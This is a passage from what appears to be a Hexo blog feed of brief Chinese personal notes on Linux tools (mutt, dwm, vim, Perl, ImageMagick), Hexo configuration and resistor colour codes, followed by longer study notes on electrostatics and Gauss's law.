    <link href="/2022/10/15/%E6%9F%A5%E7%9C%8B-qq-%E9%82%AE%E7%AE%B1%E7%9A%84-IMAP-%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/10/15/%E6%9F%A5%E7%9C%8B-qq-%E9%82%AE%E7%AE%B1%E7%9A%84-IMAP-%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>如 <a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331">这个界面</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>mutt-的使用</title>
    <link href="/2022/10/15/mutt-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/15/mutt-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>mutt 是一个框架, 而不是实现某个功能的程序.</p><h1 id="ArchWiki-相关内容"><a href="#ArchWiki-相关内容" class="headerlink" title="ArchWiki 相关内容"></a>ArchWiki 相关内容</h1><p><a href="https://wiki.archlinux.org/title/Mutt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">ArchWiki</a></p><h1 id="参考-B-站"><a href="#参考-B-站" class="headerlink" title="参考 B 站"></a>参考 B 站</h1><p><a href="https://b23.tv/7dbzabo">参考</a></p><h2 id="登录-qq-邮箱"><a href="#登录-qq-邮箱" class="headerlink" title="登录 qq 邮箱"></a>登录 qq 邮箱</h2><p>并不是用 qq 密码, 而是一个授权码.</p><p><a href="https://support.huaweicloud.com/usermanual-welink/welink_appuse_13_1.html">获取授权码</a></p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>在 <code>~/.config/mutt</code></p><h2 id="在-neomutt-界面跳转"><a href="#在-neomutt-界面跳转" class="headerlink" title="在 neomutt 界面跳转"></a>在 neomutt 界面跳转</h2><p>按 hjkl 在 右边栏跳转.</p><p>按 <code>&lt;C-j&gt;</code> 或 <code>&lt;C-k&gt;</code> 在左边栏跳转.</p><p><code>&lt;C-o&gt;</code> 进入.</p><p><code>&lt;Space&gt;</code> 查看邮件.</p><p><code>l</code> 是查看附件.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dwm-更换状态栏</title>
    <link href="/2022/10/15/dwm-%E6%9B%B4%E6%8D%A2%E7%8A%B6%E6%80%81%E6%A0%8F/"/>
    <url>/2022/10/15/dwm-%E6%9B%B4%E6%8D%A2%E7%8A%B6%E6%80%81%E6%A0%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/XosQaxz">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>为什么-Alt-等键被叫做-modkey</title>
    <link href="/2022/10/15/%E4%B8%BA%E4%BB%80%E4%B9%88-Alt-%E7%AD%89%E9%94%AE%E8%A2%AB%E5%8F%AB%E5%81%9A-modkey/"/>
    <url>/2022/10/15/%E4%B8%BA%E4%BB%80%E4%B9%88-Alt-%E7%AD%89%E9%94%AE%E8%A2%AB%E5%8F%AB%E5%81%9A-modkey/</url>
    
    <content type="html"><![CDATA[<p>modkey 是 modifier key 的意思, 用来修饰, 你单单按下 <code>Alt</code>, <code>Control</code> 并不会有效果, 需要配合其他键, 用于修饰其他键的时候才有用.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dwm-键位绑定</title>
    <link href="/2022/10/15/dwm-%E9%94%AE%E4%BD%8D%E7%BB%91%E5%AE%9A/"/>
    <url>/2022/10/15/dwm-%E9%94%AE%E4%BD%8D%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>直接将想要执行的命令放在一个脚本里面, 然后再添加到 <code>config.h</code> 中, 如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *test[] = &#123;<span class="hljs-string">&quot;/home/jie/scripts/perl/next_wallpaper.pl&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> Key keys[] = &#123;<br>    &#123; MODKEY|ShiftMask,         XK_t,   spawn,      &#123;.v = test&#125;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>大概这样写就行.</p><h1 id="使用-Alt"><a href="#使用-Alt" class="headerlink" title="使用 Alt"></a>使用 Alt</h1><p>使用 <code>Mod1Mask</code> 即可. 如 <code>MODKEY|ShiftMask</code></p><h1 id="添加了调节亮度和音量"><a href="#添加了调节亮度和音量" class="headerlink" title="添加了调节亮度和音量"></a>添加了调节亮度和音量</h1><p>需要配合 <code>Fn</code> 使用.</p><h1 id="spawn函数-源代码解析"><a href="#spawn函数-源代码解析" class="headerlink" title="spawn函数 源代码解析"></a>spawn函数 源代码解析</h1><p>声明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">spawn</span><span class="hljs-params">(<span class="hljs-type">const</span> Arg *arg)</span>;<br></code></pre></td></tr></table></figure><p>源代码内容:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">spawn</span><span class="hljs-params">(<span class="hljs-type">const</span> Arg *arg)</span><br>&#123;<br><span class="hljs-keyword">if</span> (arg-&gt;v == dmenucmd)<br>dmenumon[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;0&#x27;</span> + selmon-&gt;num;<br>selmon-&gt;tagset[selmon-&gt;seltags] &amp;= ~scratchtag;<br><span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (dpy)<br>close(ConnectionNumber(dpy));<br>setsid();<br>execvp(((<span class="hljs-type">char</span> **)arg-&gt;v)[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span> **)arg-&gt;v);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dwm: execvp %s&quot;</span>, ((<span class="hljs-type">char</span> **)arg-&gt;v)[<span class="hljs-number">0</span>]);<br>perror(<span class="hljs-string">&quot; failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-vim-中的-modkey</title>
    <link href="/2022/10/14/%E5%85%B3%E4%BA%8E-vim-%E4%B8%AD%E7%9A%84-modkey/"/>
    <url>/2022/10/14/%E5%85%B3%E4%BA%8E-vim-%E4%B8%AD%E7%9A%84-modkey/</url>
    
    <content type="html"><![CDATA[<p>在键位映射中 <code>&lt;M-c&gt;</code> 表示 modkey + c, 这里的 modkey 是电脑上的 Mod1 也就是 Alt.</p><p>如何修改暂时不清楚.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-关于-Keyboard-input-部分</title>
    <link href="/2022/10/14/ArchWiki-%E5%85%B3%E4%BA%8E-Keyboard-input-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/14/ArchWiki-%E5%85%B3%E4%BA%8E-Keyboard-input-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-dwm-更换-modkey</title>
    <link href="/2022/10/14/%E5%85%B3%E4%BA%8E-dwm-%E6%9B%B4%E6%8D%A2-modkey/"/>
    <url>/2022/10/14/%E5%85%B3%E4%BA%8E-dwm-%E6%9B%B4%E6%8D%A2-modkey/</url>
    
    <content type="html"><![CDATA[<p><a href="https://dwm.suckless.org/customisation/windows_key/">官方解决方案</a><br>dwm 默认使用系统上的 Mod1 (一般映射到 Alt 键).</p><p>将 <code>Mod1Mask</code> 改为 <code>Mod4Mask</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/14/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8A%E7%9A%84-modkey-%E5%8F%8A-%E4%B8%8E-modkey-%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E4%B8%AA/"/>
    <url>/2022/10/14/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8A%E7%9A%84-modkey-%E5%8F%8A-%E4%B8%8E-modkey-%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E4%B8%AA/</url>
    
    <content type="html"><![CDATA[<hr><p>title: 查看-Linux-上的-modkey-及-与-modkey-相关内容<br>date: 2022-10-14 11:26:19<br>tags:<br>categories: Linux<br>–</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-perl-的钻石操作符</title>
    <link href="/2022/10/14/%E5%85%B3%E4%BA%8E-perl-%E7%9A%84%E9%92%BB%E7%9F%B3%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
    <url>/2022/10/14/%E5%85%B3%E4%BA%8E-perl-%E7%9A%84%E9%92%BB%E7%9F%B3%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>其获取的内容取决与上下文.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于色环电阻的读法</title>
    <link href="/2022/10/13/%E5%85%B3%E4%BA%8E%E8%89%B2%E7%8E%AF%E7%94%B5%E9%98%BB%E7%9A%84%E8%AF%BB%E6%B3%95/"/>
    <url>/2022/10/13/%E5%85%B3%E4%BA%8E%E8%89%B2%E7%8E%AF%E7%94%B5%E9%98%BB%E7%9A%84%E8%AF%BB%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/40475101">参考</a><br><img src="https://pic1.zhimg.com/v2-7c28189184bea66c61df0f8d95baf384_r.jpg"></p><h1 id="五环电阻"><a href="#五环电阻" class="headerlink" title="五环电阻"></a>五环电阻</h1><p>与某个条带相距最远的为最后一位, 为误差.</p><p>从另一端开始读, 前三位为数值, 第四位为科学计数法 (即 $10^x$).</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-配置评论区</title>
    <link href="/2022/10/12/Hexo-%E9%85%8D%E7%BD%AE%E8%AF%84%E8%AE%BA%E5%8C%BA/"/>
    <url>/2022/10/12/Hexo-%E9%85%8D%E7%BD%AE%E8%AF%84%E8%AE%BA%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://liaoyq.club/2020/04/03/hexo-fluid%E6%B7%BB%E5%8A%A0utterances%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD/">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim-中调整代码格式</title>
    <link href="/2022/10/11/vim-%E4%B8%AD%E8%B0%83%E6%95%B4%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F/"/>
    <url>/2022/10/11/vim-%E4%B8%AD%E8%B0%83%E6%95%B4%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>=</code> 命令, 具体查看 <code>:h =</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDA-的使用</title>
    <link href="/2022/10/10/IDA-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/10/IDA-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Re</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>x64dbg-的使用</title>
    <link href="/2022/10/10/x64dbg-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/10/x64dbg-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Re</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-convert-命令</title>
    <link href="/2022/10/09/Linux-convert-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/10/09/Linux-convert-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u014743238/article/details/104636812">参考</a><br>旋转用 <code>-rotate</code> 参数:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ convert -rotate 90 input.jpg output.jpg<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-写-LaTeX-多行公式无法正确换行</title>
    <link href="/2022/10/09/Hexo-%E5%86%99-LaTeX-%E5%A4%9A%E8%A1%8C%E5%85%AC%E5%BC%8F%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E6%8D%A2%E8%A1%8C/"/>
    <url>/2022/10/09/Hexo-%E5%86%99-LaTeX-%E5%A4%9A%E8%A1%8C%E5%85%AC%E5%BC%8F%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E6%8D%A2%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p>暂时无法解决.</p><p>可以用多写几段暂时将就用.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-开启数学公式</title>
    <link href="/2022/10/09/Hexo-%E5%BC%80%E5%90%AF%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/"/>
    <url>/2022/10/09/Hexo-%E5%BC%80%E5%90%AF%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.fluid-dev.com/docs/guide/#latex-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">fluid 官网</a><br>修改 <code>_config.fluid.yml</code> 配置文件, 找到 <code>post:</code>:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">math:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">specific:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">engine:</span> <span class="hljs-string">mathjax</span><br><br></code></pre></td></tr></table></figure><p>还要在每篇文章的:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>部分添加 <code>math: ture</code>, 如:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">math:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-error-Can-not-locate-module-in-@INC</title>
    <link href="/2022/10/08/Perl-error:%20Can&#39;t-locate-module-in-@INC/"/>
    <url>/2022/10/08/Perl-error:%20Can&#39;t-locate-module-in-@INC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://alvinalexander.com/blog/post/perl/perl-error-cant-locate-module-in-inc/">参考1</a><br>这个报错意味着这个模块不在 Perl’s include path (也就是 <code>@INC</code> 这个变量).</p><p><code>@INC</code> 这个 INC 应该可以看作 INClude.</p><p>查看 <code>@INC</code> 这个数组的值:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -e <span class="hljs-string">&#x27;print join(&quot;\n&quot;, @INC);&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://alvinalexander.com/blog/post/perl/checking-testing-perl-module-in-inc-include-path/">参考2</a></h1><p>测试一个系统是否安装了 perl 的某个模块:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -e <span class="hljs-string">&#x27;use Error;&#x27;</span><br></code></pre></td></tr></table></figure><p><code>-e</code> 参数应该是 execute. 用于在命令行执行 perl 代码, 这里的原理就是, 如果存在这个模块, 你用 <code>use</code> 指令就不会报错.</p><p>如果报错也不是说这个模块安装, 而是没有在 <code>@INC</code> include path 中.</p><h2 id="修改-INC-include-path"><a href="#修改-INC-include-path" class="headerlink" title="修改 @INC include path"></a><a href="https://alvinalexander.com/perl/edu/articles/pl010015/">修改 <code>@INC</code> include path</a></h2><p>如果是 root 用户, perl 的模块会被安装到默认的位置.</p><p>添加 <code>@INC</code> 的 search directory:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> lib <span class="hljs-string">&#x27;/home/george/modules&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大物II上半期</title>
    <link href="/2022/10/08/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F/"/>
    <url>/2022/10/08/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-19-Electric-Charge-and-Electric-Field"><a href="#Chapter-19-Electric-Charge-and-Electric-Field" class="headerlink" title="Chapter 19 Electric Charge and Electric Field"></a>Chapter 19 Electric Charge and Electric Field</h1><p>任何活动产生的净电荷量为零. The net amount of electric charge produced in any process is zero.</p><p>电荷从一个物体转移到另一个物体.</p><h2 id="19-2-Electric-Charge-in-the-Atom"><a href="#19-2-Electric-Charge-in-the-Atom" class="headerlink" title="19.2 Electric Charge in the Atom"></a>19.2 Electric Charge in the Atom</h2><p>为什么摩擦后的物体在一段时间后又恢复到了电中性?</p><p>由于水分子的极性, 也就是说尽管水分子是呈中性, 但是其内部的电荷分布不均衡, 因此物体上的电荷会被水分子上偏正电性的一端所吸引, 就会 leak off into air.</p><h2 id="19-3-Insulators-and-Conductors"><a href="#19-3-Insulators-and-Conductors" class="headerlink" title="19.3 Insulators and Conductors"></a>19.3 Insulators and Conductors</h2><p>Insulating 就是 ‘绝缘的’ 的意思.</p><p>绝缘体并不是完全不导电.</p><p>Insulating material 中的电子 bound very tightly to th nuclei.</p><h2 id="19-5-Coulomb’s-Law"><a href="#19-5-Coulomb’s-Law" class="headerlink" title="19.5 Coulomb’s Law"></a>19.5 Coulomb’s Law</h2><p>公式为:</p><p>$F &#x3D; k \frac{Q_1Q_2}{r^2}$</p><p>k 是一个常量. $k &#x3D; 8.988 \times 10^9 N \cdot m^2&#x2F;C^2$</p><p>一个电子 electron 的电荷量为:</p><p>$e &#x3D; 1.602 \times 10^{-19}C$</p><p>e 被定义为一个正值. 因此 electron 的电荷量实际为 -e.</p><p>任何物体的净电荷都必须是 e 的整数倍如: e, 2e, 3e …</p><p>k 常用另一个常量 $\epsilon_0$ 替换:<br>$$<br>k &#x3D; \frac{1}{4 \pi \epsilon_0}, \epsilon_0 &#x3D; 8.85 \times 10^{-12}C^2&#x2F;N \cdot m^2<br>$$<br>因此, Coulomb’s Law 又被写成:<br>$$<br>F &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q_1 Q_2}{r^2}<br>$$</p><h2 id="19-6-The-Electric-Field"><a href="#19-6-The-Electric-Field" class="headerlink" title="19.6 The Electric Field"></a>19.6 The Electric Field</h2><p>电场的大小和 test charge 的电荷量无关, 因为这里的 test charge 取的电荷量是极小的, 不会影响到电场, 也可以通过库仑定理推出.</p><p>电场被定义为, 作用在一个极小的正电荷上的力除以这个电荷的电荷量:<br>$$<br>E &#x3D; \frac{F}{q}<br>$$<br>方向为电荷受到的力的方向. 单位是 N\C .</p><p>另一个常用的形式为:<br>$$<br>E &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q}{r^2}<br>$$<br>可以想, 电场力的大小和距离有关, 这里自然也是. 隔得近, 受到的电场力大, 电场也大.</p><h2 id="19-7-Electric-Field-Calculations-for-Continuous-Charge-Distributions"><a href="#19-7-Electric-Field-Calculations-for-Continuous-Charge-Distributions" class="headerlink" title="19.7 Electric Field Calculations for Continuous Charge Distributions"></a>19.7 Electric Field Calculations for Continuous Charge Distributions</h2><p>形成电场的这个物体, 我们一般可以看作是电荷均匀分布的, 用微分的方式写为 $dQ$. 电场就是:<br>$$<br>dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dQ}{r^2}<br>$$<br>总的电场就是:<br>$$<br>E &#x3D; \int dE<br>$$<br>$dE$ 是一个矢量.</p><h2 id="模型题"><a href="#模型题" class="headerlink" title="模型题"></a>模型题</h2><h3 id="Uniformly-charged-ring"><a href="#Uniformly-charged-ring" class="headerlink" title="Uniformly charged ring"></a>Uniformly charged ring</h3><p>电荷在圆环上均匀分布, 已知单位长度的电荷密度 $\lambda$, 求轴线上的电场大小.</p><p>先求 $dQ$ 形成的电场, 再求积分.<br><img src="/../img/E_ring.png"><br>经验:</p><ul><li>利用对称性减轻计算的复杂程度</li><li>用 charge density 来表示 $dQ$ </li><li>对 r 的范围作出判断</li></ul><h3 id="A-line-of-charge"><a href="#A-line-of-charge" class="headerlink" title="A line of charge"></a>A line of charge</h3><p>先求一小段 $dy$ 形成的电场, 再求积分<br><img src="/../img/E_stick.png"></p><h3 id="Uniformly-charged-disk"><a href="#Uniformly-charged-disk" class="headerlink" title="Uniformly charged disk"></a>Uniformly charged disk</h3><p>已知的是电荷密度 $\sigma$ 单位是 $C&#x2F;m^2$.</p><p>先算出圆环形成的电场, 再通过积分.<br><img src="/../img/E_disk.png"><br>这里得到的一个结论为, 如果圆盘的半径特别大, 无穷大, 那么:<br>$$<br>E &#x3D; \frac{\sigma}{2 \epsilon_0}<br>$$</p><h3 id="A-plane-of-charge"><a href="#A-plane-of-charge" class="headerlink" title="A plane of charge"></a>A plane of charge</h3><p>两个 plates 之间的距离 d 非常小. 用上面的结论.<br>$$<br>E &#x3D; \frac{\sigma}{2 \epsilon_0}<br>$$<br><img src="/../img/E_plates.png"><br>内部为两倍, 外部为零.</p><h2 id="19-8-Field-Lines"><a href="#19-8-Field-Lines" class="headerlink" title="19.8 Field Lines"></a>19.8 Field Lines</h2><p>电场线的方向为 positive test charge 的受力方向.</p><p>也就是说, 一个带电物体产生的电场作用于外面一个 positive test charge, 这个 charge 受力的方向就是电场线的方向.</p><p>电场线的密集程度可以反映电场的大小.</p><p>电场线不会相交.</p><h2 id="19-9-电场和导体-Electric-Field-and-Conductors"><a href="#19-9-电场和导体-Electric-Field-and-Conductors" class="headerlink" title="19.9 电场和导体 Electric Field and Conductors"></a>19.9 电场和导体 Electric Field and Conductors</h2><p>导体内部的电场始终为零, 不论是实心还是空心, 若内部的一侧带电, 那么电子会移动到相对的一侧并将其抵消.</p><p>导体的电性都是表现在表面. any net charge on a conductors distributes itself on the surface.<br><img src="/../img/inside_is_zero.png"></p><p>导体内部的电场为零 (可以这样想, 外面有电场时, 内部形成的电场, 其和外部电场大小相等方向相反, 就抵消了, 此时为零, 而当导体不处于电场中时, 其本身电场就为零)</p><p>当一个导体处于一个电场中时, 如:<br><img src="/../img/inside_zero.png"></p><p>这个导体表现出来的是电场为零, 因为内部形成的电场会和外部的抵消.</p><h2 id="19-10-带电粒子在电场中的移动-Motion-of-Charged-Particle-in-an-Electric-Field"><a href="#19-10-带电粒子在电场中的移动-Motion-of-Charged-Particle-in-an-Electric-Field" class="headerlink" title="19.10 带电粒子在电场中的移动 Motion of Charged Particle in an Electric Field"></a>19.10 带电粒子在电场中的移动 Motion of Charged Particle in an Electric Field</h2><p>还是高中的那一套:<br><img src="/../img/motion_particle.png"></p><p>$$<br>F &#x3D; qE, \newline<br>a &#x3D; \frac{F}{m} &#x3D; \frac{qE}{m}, \newline<br>v &#x3D; \sqrt{2ax}<br>$$</p><h2 id="19-11-Electric-Dipoles"><a href="#19-11-Electric-Dipoles" class="headerlink" title="19.11 Electric Dipoles"></a>19.11 Electric Dipoles</h2><p>Electric Dipoles 是大小相等, 电性相反, 之间有一段距离 l 的两个带点粒子.<br><img src="/../img/electric_dipole.png"></p><p>$Ql$ 被称作 dipole moment, 用符号 p 表示, 是一个矢量 (毕竟是 moment).</p><p>含有 electric dipole 的分子如 CO 被称作 polar molecules.</p><h3 id="Dipole-in-an-External-Field"><a href="#Dipole-in-an-External-Field" class="headerlink" title="Dipole in an External Field"></a>Dipole in an External Field</h3><p><img src="/../img/dipole_in_external_field.png"></p><p>电场分布均匀, 这里 dipole 受到的合外力就为 0. 但是有 torque 作用在上面:<br>$$<br>\tau &#x3D; QE \frac{l}{2} sin\theta + QE \frac{l}{2} sin\theta &#x3D; pE sin\theta<br>$$<br>这里的 $pE sin\theta$ 就可以写成叉乘的形式:</p><p>$$<br>\tau &#x3D; p \times E<br>$$</p><p>转动系做的功就是力矩乘以旋转的角度:</p><p>$$<br>W &#x3D; \int_{\theta 1}^{\theta 2} \tau d\theta<br>$$</p><h1 id="Chapter-20-Gauss’s-Law"><a href="#Chapter-20-Gauss’s-Law" class="headerlink" title="Chapter 20 Gauss’s Law"></a>Chapter 20 Gauss’s Law</h1><p>高斯定理是用来描述 electric charge 和 electric field 的关系的.</p><p>高斯定理是 Coulomb’s law 的一种更 general 的形式.</p><h2 id="20-1-Electric-Flux"><a href="#20-1-Electric-Flux" class="headerlink" title="20.1 Electric Flux"></a>20.1 Electric Flux</h2><p>$\phi$ 可以看作是垂直穿过的电场线的总条数.</p><p>Electric Flux 的定义为:<br>$$<br>\phi_E &#x3D; EA<br>$$<br>E 是电场强度 (可以看作是电场线的密度), A 是平面的面积. (因此可以理解为, 电场线的面密度乘以面积, 就得到了电场线的总条数)</p><p>由于是要垂直穿过, 而电场和面不一定垂直, 如:<br><img src="/../img/flux_perpenticular.png"><br>所以这样写:<br>$$<br>\phi_E &#x3D; EA_T &#x3D; EAcos\theta<br>$$<br>看到 $cos\theta$ 我们可以写为点乘的形式:<br>$$<br>\phi_E &#x3D; E \cdot A<br>$$<br>改成点乘后要注意, 这里的 $A$ 是 vector 了. 方向是垂直于平面. 为什么这里是垂直与平面?</p><p>因为最终求的是 $\phi$, 其垂直于平面, 这里就 <mark>规定</mark> A 是垂直于平面的, 这时又可以得到 $\theta$, 就有 $Ecos\theta$ 也是垂直于平面.</p><p>上面的公式考虑的是电场分布均匀的情况. 当不均匀, 我们就用到积分的知识:<br>$$<br>\phi_E \approx \sum_{i&#x3D;1}^{n}E_i \cdot \Delta A_i<br>$$</p><p>也就是:<br>$$<br>\phi_E &#x3D; \int E \cdot dA<br>$$</p><p>很多情况下, 我们计算的都是 closed surface 的 flux, 如:<br><img src="/../img/closed_surface.png"></p><p>因此又可以写成闭合曲线积分的形式:<br>$$<br>\phi_E &#x3D; \oint E \cdot dA<br>$$<br>E 和 $dA$ 之间的角度 $\theta$ 的值小于 $\frac{\pi}{2}$.</p><p>一般规定电场线 outward 为正, entering 为负.</p><p>只要封闭的曲线内部没有电荷, 那么总的 flux 就为 0 (进来了又出去).</p><p>内部有电荷, flux 就不会为零, 如:<br><img src="/../img/charge_inside.png"></p><p>为什么叫 flux?</p><p>“flux” 这个词来源于拉丁语 “flow”. 也就是看作 fluid flow.</p><h2 id="20-2-高斯定理-Gauss’s-Law"><a href="#20-2-高斯定理-Gauss’s-Law" class="headerlink" title="20.2 高斯定理 Gauss’s Law"></a>20.2 高斯定理 Gauss’s Law</h2><p>公式内容:<br>$$<br>\oint E \cdot dA &#x3D; \frac{Q_{encl}}{\epsilon_0}<br>$$<br>这里的 $Q_{encl}$ 表示的是 enclosed 的电荷量.</p><p>因为高斯定理适用于任一 surface (只要能把内部的电荷包裹起来就可以了, 毕竟计算的是 $\phi$ 是电场线的数量, 数量自然和 surface 没有关系), 